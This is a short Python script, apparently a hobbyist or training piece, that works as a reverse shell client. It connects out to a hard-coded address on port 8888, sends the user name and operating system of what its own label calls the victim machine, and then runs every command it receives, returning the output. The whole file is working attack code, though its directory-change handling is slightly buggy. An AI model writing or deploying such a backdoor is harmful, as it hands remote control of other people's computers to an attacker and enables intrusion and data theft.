from socket import *
import subprocess
from getpass import getuser
import platform
import os

get_os = platform.uname()[0]
get_user = getuser()
os_info = 'Máy nạn nhân :' + str(get_user) + "[+]" + "OS in4 :" + str(get_os)
ip = '192.168.1.104'
port = 8888
connection = socket(AF_INET, SOCK_STREAM)
connection.connect((ip,port))
connection.send(os_info.encode()) 
while True:
    recever = connection.recv(1024).decode()
    if recever == "exit":
        exit()
    elif recever[:2] == 'cd':
        os.chdir(recever[:3])
        connection.send(os.getcwd().encode())
    else:
        out_put = subprocess.getoutput(recever)   
        if out_put == "" or out_put == None:
            out_put = 'erro'
            connection.send(out_put.encode())
        else:
            connection.send(out_put.encode())    
